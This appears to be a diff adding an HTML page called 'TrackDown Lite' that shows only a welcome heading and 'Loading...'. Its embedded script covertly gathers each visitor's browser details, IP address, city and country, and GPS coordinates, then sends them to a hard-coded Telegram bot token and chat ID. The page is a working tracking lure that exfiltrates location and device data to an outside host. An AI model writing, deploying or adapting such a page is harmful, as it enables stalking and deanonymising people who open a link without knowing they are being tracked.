@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TrackDown Lite</title>
+</head>
+<body>
+    <h1>Welcome to TrackDown!</h1>
+    <p>Loading...</p>
+
+    <script>
+        // Masukkan token bot Telegram Anda di sini
+        const telegramToken = "AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
+        // Masukkan chat ID atau grup ID Telegram Anda
+        const chatId = "7375262668";
+
+        // Fungsi untuk mengirim data ke bot Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+            .then(response => console.log("Data sent to Telegram"))
+            .catch(error => console.error("Error sending to Telegram:", error));
+        }
+
+        // Dapatkan informasi perangkat
+        const deviceInfo = `
+            Browser: ${navigator.userAgent}
+            Platform: ${navigator.platform}
+            Language: ${navigator.language}
+        `;
+
+        // Dapatkan alamat IP menggunakan API pihak ketiga
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                const ipInfo = `
+                    IP Address: ${data.ip}
+                    City: ${data.city}
+                    Region: ${data.region}
+                    Country: ${data.country_name}
+                `;
+                
+                // Kirim informasi IP ke Telegram
+                sendToTelegram(`Device Info:\n${deviceInfo}\nIP Info:\n${ipInfo}`);
+            })
+            .catch(error => console.error("Error fetching IP data:", error));
+
+        // Dapatkan lokasi geografis
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const locationInfo = `
+                        Latitude: ${position.coords.latitude}
+                        Longitude: ${position.coords.longitude}
+                        Accuracy: ${position.coords.accuracy} meters
+                    `;
+                    // Kirim informasi lokasi ke Telegram
+                    sendToTelegram(`Location Info:\n${locationInfo}`);
+                },
+                (error) => {
+                    sendToTelegram("Location Info: Could not retrieve location.");
+                }
+            );
+        } else {
+            sendToTelegram("Location Info: Geolocation not supported by browser.");
+        }
+    </script>
+</body>
+</html>
